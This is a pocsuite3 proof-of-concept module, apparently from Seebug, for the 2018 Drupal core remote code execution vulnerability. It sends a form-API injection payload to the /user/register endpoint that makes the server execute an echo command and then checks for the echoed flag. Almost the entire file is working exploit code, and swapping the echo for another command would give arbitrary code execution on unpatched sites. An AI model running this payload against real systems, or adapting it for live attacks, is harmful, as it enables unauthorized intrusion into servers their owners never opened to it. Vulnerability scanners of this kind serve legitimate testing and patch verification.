"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit https://pocsuite.org
"""

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, logger, VUL_TYPE
from pocsuite3.lib.utils import random_str


class DemoPOC(POCBase):
    vulID = '97207'  # ssvid
    version = '1.0'
    author = ['seebug']
    vulDate = '2018-03-08'
    createDate = '2018-04-12'
    updateDate = '2018-04-13'
    references = ['https://www.seebug.org/vuldb/ssvid-97207']
    name = 'Drupal core Remote Code Execution'
    appPowerLink = ''
    appName = 'Drupal'
    appVersion = ''
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''
    '''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):
        result = {}
        flag = random_str(length=10)
        url = self.url.rstrip(
            '/') + "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
        payload = {
            'form_id': 'user_register_form',
            '_drupal_ajax': '1',
            'mail[#post_render][]': 'exec',
            'mail[#type]': 'markup',
            'mail[#markup]': 'echo "{0}";'.format(flag)
        }

        resp = requests.post(url, data=payload)
        try:
            if '"data":"{0}'.format(flag) in resp.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['Postdata'] = payload
        except Exception as ex:
            logger.error(str(ex))

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    _attack = _verify


register_poc(DemoPOC)
